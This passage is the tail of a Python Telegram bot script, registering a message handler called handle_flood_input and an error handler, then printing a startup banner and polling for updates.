    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_flood_input))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    print("✅ Bot is LIVE! Send /start on Telegram")
    print("=" * 60)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

# ============ RUN BOT ============
if __name__ == "__main__":
    main()
